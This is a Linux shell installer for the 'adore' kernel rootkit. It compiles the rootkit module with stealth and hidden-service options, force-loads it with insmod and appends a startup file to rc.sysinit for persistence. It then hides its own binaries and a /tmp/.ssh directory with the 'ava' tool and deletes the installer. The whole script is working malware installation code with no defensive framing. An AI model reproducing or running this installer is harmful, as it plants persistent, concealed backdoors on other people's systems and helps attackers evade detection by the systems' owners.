#!/bin/sh
echo "Installation sequence begun..."
mv ws /sbin/WS
if [ ! -f /usr/bin/cc ]; then
 echo "cc not found :(" ; exit 1
fi
echo -n "checking module shit: ..."
if [ -x /sbin/lsmod ]; then
 /sbin/lsmod 1> /dev/null 2> /dev/null;test=$?
 if [ "$test" = "1" ]; then
  echo -e "\b\b\bFailed. something is fucked up." ; exit 1
 else
  tfile1=/tmp/mods.$RANDOM
  /sbin/lsmod > $tfile1
  echo -e "\b\b\bDone!"
 fi
else
 if [ -x /bin/lsmod ]; then
  /bin/lsmod 1> /dev/null 2> /dev/null;test=$?
  if ["$test" = "1" ]; then
   echo -e "\b\b\bFailed. something is fucked up." ; exit 1
  else
   tfile1=/tmp/mods.$RANDOM
   /bin/lsmod > $tfile1
   echo -e "\b\b\bDone!"   
  fi
 else
  echo -e "\b\b\bFailed. something is fucked up." ; rm -f $tfile1; exit 1
 fi
fi

echo -n "Installing adore: ..."
if [ ! -f adore/adore.c ]; then
 cd .. ; echo -e "\b\b\badore not found. :(" ; exit 1
else
 cd adore
 if [ -z "`uname -a|grep -i smp`" ]; then
  if [ ! -z "`grep kernel_thread_R. /proc/ksyms`" ]; then
   cc -c -I/usr/src/linux/include -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 \
   -DHIDDEN_SERVICE="\":12345\"" -DCURRENT_ADORE=47 -DMODVERSIONS adore.c -o adore.o
   cc -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 -DCURRENT_ADORE=47 \
   -DHIDDEN_SERVICE="\":12345\"" -DMODVERSIONS -O2 -Wall ava.c libinvisible.c -o ava
  else
   cc -c -I/usr/src/linux/include -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 \
   -DHIDDEN_SERVICE="\":12345\"" -DCURRENT_ADORE=47 adore.c -o adore.o              
   cc -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 -DCURRENT_ADORE=47 \
   -DHIDDEN_SERVICE="\":12345\"" -O2 -Wall ava.c libinvisible.c -o ava              
  fi
 else 
  if [ ! -z "`grep kernel_thread_R. /proc/ksyms`" ]; then
   cc -c -I/usr/src/linux/include -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 \
   -DHIDDEN_SERVICE="\":12345\"" -DCURRENT_ADORE=47 -D__SMP__ -DMODVERSIONS adore.c -o adore.o
   cc -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 -DCURRENT_ADORE=47 \
   -DHIDDEN_SERVICE="\":12345\"" -D__SMP__ -DMODVERSIONS -O2 -Wall ava.c libinvisible.c -o ava
  else
   cc -c -I/usr/src/linux/include -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 \  
   -DHIDDEN_SERVICE="\":12345\"" -DCURRENT_ADORE=47 -D__SMP__ adore.c -o adore.o              
   cc -O2 -Wall -DBEHAVE_STEALTH -DELITE_CMD=12345 -DELITE_UID=12345 -DCURRENT_ADORE=47 \
   -DHIDDEN_SERVICE="\":12345\"" -D__SMP__ -O2 -Wall ava.c libinvisible.c -o ava              
  fi
 fi
 if [ -f /sbin/insmod ]; then
  /sbin/insmod -f adore.o >/dev/null 2>&1
 else
  if [ -f /bin/insmod ]; then
   /bin/insmod -f adore.o >/dev/null 2>&1
  fi
 fi
 cd .. ; echo -e "\b\b\bDone!"
fi
mv adore/adore.o /lib
echo
if [ -f /lib/adore.o ]; then
   mv adore/ava /bin/AVA
   echo -n "Setting up rc.syswhatever: ..."
   if [ -f /etc/rc.d/rc.sysinit ]; then
      cat rc >> /etc/rc.d/rc.sysinit
   else
      if [ -f /etc/rc.d/rc.sysvinit ]; then
        cat rc >> /etc/rc.d/rc.sysvinit
      fi
   fi
fi
echo -e "\b\b\bDone!"
echo -n "Hiding stuff: ..."
mkdir /tmp/.ssh >/dev/null 2>&1
if [ -x /bin/AVA ]; then
 /bin/AVA h /sbin/WS >/dev/null
 /bin/AVA h /bin/AVA >/dev/null
 /bin/AVA h /lib/adore.o >/dev/null
 /bin/AVA h /tmp/.tmp >/dev/null
 /bin/AVA h /tmp/.ssh >/dev/null
 echo -e "\b\b\bDone!"
else
 cd .. ;echo -e "\b\b\bNot installed or wrong ava found :("
fi 
echo -n "Checking for more modules: ..."
tfile2=/tmp/mods.$RANDOM
if [ -f /sbin/lsmod ]; then
 /sbin/lsmod > $tfile2
else
 if [ -f /bin/lsmod ]; then
  /bin/lsmod > $tfile2
 fi
fi
if [ "`wc -l $tfile1|awk '{print $1}'`" = "`wc -l $tfile2|awk '{print $1}'`" ]; then
 echo -e "\b\b\bNope."
else
 echo -e "\b\b\b0ops!"
 echo "old mods:" ; cat $tfile1
 echo "new mods:" ; cat $tfile2
fi
rm -f install.sh $tfile1 $tfile2 >/dev/null 2>&1
echo -e "\b\b\bInstallation complete!"
